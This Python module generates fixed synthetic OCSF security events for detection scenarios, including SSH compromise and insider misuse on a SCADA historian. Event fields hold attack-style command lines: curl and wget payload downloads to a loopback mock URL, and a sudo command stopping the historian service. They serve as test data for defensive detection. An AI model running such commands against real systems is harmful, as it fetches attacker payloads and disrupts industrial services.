"""Deterministic synthetic scenario generation.

Every scenario produces the SAME OCSF-compatible events on every run (fixed
timestamps and event IDs), enabling reproducible replay and deduplication.
All telemetry is synthetic; no real hosts, IPs, downloads or actions.
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
from typing import Any

from . import ocsf

BASE = datetime(2026, 1, 15, 2, 0, 0, tzinfo=timezone.utc)
MOCK_PAYLOAD_URL = "http://127.0.0.1:9/mock/payload.enc"  # non-routable mock; never fetched


def _t(offset_seconds: int) -> str:
    return (BASE + timedelta(seconds=offset_seconds)).isoformat()


def _daytime(hour: int, minute: int = 0) -> str:
    return datetime(2026, 1, 15, hour, minute, 0, tzinfo=timezone.utc).isoformat()


SCENARIOS: dict[str, dict[str, Any]] = {
    "SCENARIO_1_SSH_COMPROMISE": {
        "name": "SSH Compromise",
        "description": "Failed SSH bursts, one success from a new device, process execution, synthetic payload retrieval.",
        "severity": "high",
        "benign": False,
    },
    "SCENARIO_2_INSIDER_MISUSE": {
        "name": "Insider Misuse",
        "description": "Valid maintenance user acting outside window, restricted unassigned asset, privileged action, canary access.",
        "severity": "high",
        "benign": False,
    },
    "SCENARIO_3_COORDINATED_CAMPAIGN": {
        "name": "Coordinated Campaign",
        "description": "Low-severity findings across three sites sharing infrastructure and time window, correlated into one campaign.",
        "severity": "medium",
        "benign": False,
    },
    "SCENARIO_4_BENIGN_MAINTENANCE": {
        "name": "Benign Maintenance",
        "description": "Valid user in an approved maintenance window performing normal access. Anomaly stays low.",
        "severity": "low",
        "benign": True,
    },
    "SCENARIO_5_DISCONNECTED_OPERATION": {
        "name": "Disconnected Operation",
        "description": "Local generation and scoring during link loss; queued events replayed on restore without duplication.",
        "severity": "high",
        "benign": False,
    },
}


def _scenario_1() -> list[dict[str, Any]]:
    sid = "SCENARIO_1_SSH_COMPROMISE"
    site = "site-01"
    user = "sysops"
    attacker_ip = "203.0.113.45"
    src_host = "attacker-vm"
    target = "target-web-01"
    common = dict(site_id=site, scenario_id=sid, asset_criticality="high",
                  user_role="operator", mission_state="elevated", network_zone="dmz")
    events = []
    for i in range(3):
        events.append(ocsf.build_authentication(
            event_id=f"S1-AUTH-FAIL-{i+1}", time=_t(i * 5), user=user, src_ip=attacker_ip,
            src_host=src_host, dst_host=target, success=False, severity_id=3, **common))
    events.append(ocsf.build_authentication(
        event_id="S1-AUTH-OK", time=_t(20), user=user, src_ip=attacker_ip, src_host=src_host,
        dst_host=target, success=True, severity_id=4, **common))
    events.append(ocsf.build_process_activity(
        event_id="S1-PROC", time=_t(30), user=user, host=target, process_name="bash",
        cmd_line=f"bash -c 'curl -s {MOCK_PAYLOAD_URL} -o /tmp/p.enc'", parent_name="sshd",
        severity_id=4, **common))
    # Distinct "synthetic payload retrieval" network flow (no url -> no duplicate
    # payload node; the process branch owns the process->payload T1105 edge).
    events.append(ocsf.build_network_activity(
        event_id="S1-NET", time=_t(32), src_ip="10.10.1.20", dst_ip="127.0.0.1", dst_port=9,
        protocol="tcp", bytes_out=512, bytes_in=409600, duration_ms=120,
        severity_id=4, **common))
    return events


def _scenario_2() -> list[dict[str, Any]]:
    sid = "SCENARIO_2_INSIDER_MISUSE"
    site = "site-02"
    user = "maint-user"
    common = dict(site_id=site, scenario_id=sid, asset_criticality="critical",
                  user_role="maintenance", mission_state="operation", network_zone="ot")
    events = [
        ocsf.build_authentication(
            event_id="S2-AUTH", time=_daytime(2, 14), user=user, src_ip="10.20.0.9",
            src_host="maint-laptop", dst_host="scada-hist-01", success=True, severity_id=3,
            outside_maintenance_window=True, **common),
        ocsf.build_file_activity(
            event_id="S2-FILE-RESTRICTED", time=_daytime(2, 16), user=user, host="scada-hist-01",
            file_path="/restricted/plantA/config.bin", file_name="config.bin", severity_id=3,
            unassigned_asset=True, **common),
        ocsf.build_process_activity(
            event_id="S2-PRIV", time=_daytime(2, 18), user=user, host="scada-hist-01",
            process_name="sudo", cmd_line="sudo systemctl stop historian", parent_name="bash",
            severity_id=4, outside_maintenance_window=True, **common),
        ocsf.build_file_activity(
            event_id="S2-CANARY", time=_daytime(2, 20), user=user, host="scada-hist-01",
            file_path="/canary/DO_NOT_OPEN.xlsx", file_name="DO_NOT_OPEN.xlsx", is_canary=True,
            severity_id=5, **common),
    ]
    return events


def _scenario_3() -> list[dict[str, Any]]:
    sid = "SCENARIO_3_COORDINATED_CAMPAIGN"
    shared_ip = "198.51.100.10"
    shared_user = "svc-sync"
    events = []
    for idx, site in enumerate(["site-01", "site-02", "site-03"]):
        common = dict(site_id=site, scenario_id=sid, asset_criticality="medium",
                      user_role="service", mission_state="steady", network_zone="corp")
        events.append(ocsf.build_authentication(
            event_id=f"S3-{site}-AUTH-FAIL", time=_daytime(3, 0 + idx), user=shared_user,
            src_ip=shared_ip, src_host="sync-relay", dst_host=f"{site}-app-01",
            success=False, severity_id=2, campaign_feature=shared_ip, **common))
        events.append(ocsf.build_authentication(
            event_id=f"S3-{site}-AUTH-OK", time=_daytime(3, 2 + idx), user=shared_user,
            src_ip=shared_ip, src_host="sync-relay", dst_host=f"{site}-app-01",
            success=True, severity_id=2, campaign_feature=shared_ip, **common))
    return events


def _scenario_4() -> list[dict[str, Any]]:
    sid = "SCENARIO_4_BENIGN_MAINTENANCE"
    site = "site-02"
    user = "maint-user"
    common = dict(site_id=site, scenario_id=sid, asset_criticality="medium",
                  user_role="maintenance", mission_state="maintenance", network_zone="ot",
                  authorized_activity=True, maintenance_window=True)
    events = [
        ocsf.build_authentication(
            event_id="S4-AUTH", time=_daytime(10, 5), user=user, src_ip="10.20.0.5",
            src_host="maint-jump-01", dst_host="scada-hist-01", success=True, severity_id=1,
            **common),
        ocsf.build_process_activity(
            event_id="S4-PROC", time=_daytime(10, 10), user=user, host="scada-hist-01",
            process_name="python3", cmd_line="python3 /opt/maint/healthcheck.py",
            parent_name="cron", severity_id=1, **common),
        ocsf.build_file_activity(
            event_id="S4-FILE", time=_daytime(10, 12), user=user, host="scada-hist-01",
            file_path="/opt/maint/report.log", file_name="report.log", severity_id=1, **common),
    ]
    return events


def _scenario_5() -> list[dict[str, Any]]:
    # Same shape as scenario 1 but under a disconnected/queued context.
    sid = "SCENARIO_5_DISCONNECTED_OPERATION"
    site = "site-03"
    user = "fieldops"
    attacker_ip = "203.0.113.77"
    target = "edge-node-03"
    common = dict(site_id=site, scenario_id=sid, asset_criticality="high",
                  user_role="operator", mission_state="disconnected", network_zone="edge")
    events = []
    for i in range(2):
        events.append(ocsf.build_authentication(
            event_id=f"S5-AUTH-FAIL-{i+1}", time=_daytime(4, i), user=user, src_ip=attacker_ip,
            src_host="edge-attacker", dst_host=target, success=False, severity_id=3, **common))
    events.append(ocsf.build_authentication(
        event_id="S5-AUTH-OK", time=_daytime(4, 3), user=user, src_ip=attacker_ip,
        src_host="edge-attacker", dst_host=target, success=True, severity_id=4, **common))
    events.append(ocsf.build_process_activity(
        event_id="S5-PROC", time=_daytime(4, 5), user=user, host=target, process_name="bash",
        cmd_line=f"bash -c 'wget {MOCK_PAYLOAD_URL}'", parent_name="sshd", severity_id=4, **common))
    return events


_BUILDERS = {
    "SCENARIO_1_SSH_COMPROMISE": _scenario_1,
    "SCENARIO_2_INSIDER_MISUSE": _scenario_2,
    "SCENARIO_3_COORDINATED_CAMPAIGN": _scenario_3,
    "SCENARIO_4_BENIGN_MAINTENANCE": _scenario_4,
    "SCENARIO_5_DISCONNECTED_OPERATION": _scenario_5,
}


def list_scenarios() -> list[dict[str, Any]]:
    from . import graph_builder
    out = []
    for sid, meta in SCENARIOS.items():
        events = build_events(sid)
        n, e = graph_builder.ground_truth_counts(events)
        out.append({
            "scenario_id": sid,
            "name": meta["name"],
            "description": meta["description"],
            "severity": meta["severity"],
            "benign": meta["benign"],
            "ground_truth_nodes": n,
            "ground_truth_edges": e,
        })
    return out


def build_events(scenario_id: str) -> list[dict[str, Any]]:
    if scenario_id not in _BUILDERS:
        raise KeyError(scenario_id)
    return _BUILDERS[scenario_id]()


def is_campaign(scenario_id: str) -> bool:
    return scenario_id == "SCENARIO_3_COORDINATED_CAMPAIGN"
